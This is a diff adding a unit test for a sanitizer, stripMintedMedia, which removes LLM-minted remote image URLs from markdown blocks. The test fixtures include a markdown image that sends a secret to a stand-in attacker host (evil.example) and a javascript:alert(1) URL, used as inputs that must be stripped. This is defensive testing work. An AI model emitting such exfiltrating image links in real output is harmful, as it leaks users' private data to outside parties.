@@ -172,6 +172,17 @@ describe('canvasSpec — GD-7e media refs + video (§8.7, refs-not-URLs)', () =>
     assert.equal(normalizeBlock({ kind: 'video', src: 'data:video/mp4;base64,AAAA' }), null);
     assert.ok(BLOCK_KINDS.includes('video'));
   });
+  it('GD-7h stripMintedMedia TEXT pass: a minted-URL inline image collapses to its alt text; ref-target inline images survive', async () => {
+    const { stripMintedMedia } = await import('./canvasSpec.js');
+    const spec = { blocks: [
+      { kind: 'compose', ref: 'r', text: 'Press ![pinhole](kb:1#img1) then see ![exfil](https://evil.example/x.png?d=secret) now.' },
+      { kind: 'markdown', text: '![ok](attachment:a1) and ![bad](javascript:alert(1))' },
+    ] };
+    const out = stripMintedMedia(spec);
+    assert.equal(out.blocks[0].text, 'Press ![pinhole](kb:1#img1) then see exfil now.');
+    assert.equal(out.blocks[1].text, '![ok](attachment:a1) and bad');
+  });
+
   it('stripMintedMedia: an LLM-minted remote src is stripped (ref survives; src-only block drops whole); data: raster + non-media blocks untouched', async () => {
     const { stripMintedMedia } = await import('./canvasSpec.js');
     const spec = { title: 'T', blocks: [
